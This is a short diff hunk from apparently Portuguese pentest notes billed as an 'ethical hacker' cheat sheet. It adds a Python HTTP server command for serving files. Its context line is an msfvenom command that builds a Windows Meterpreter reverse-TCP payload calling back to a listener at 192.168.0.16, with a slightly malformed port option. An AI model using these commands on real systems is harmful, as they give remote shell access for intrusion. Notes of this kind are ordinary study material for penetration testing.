@@ -40,6 +40,10 @@ Encontre aqui notas e comandos de um HACKER ÉTICO
 	
 .
 
+	python3 -m http.server 8080
+
+.
+
 	msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.0.16 lport:443 -f ext -o name.ext
 	
 .
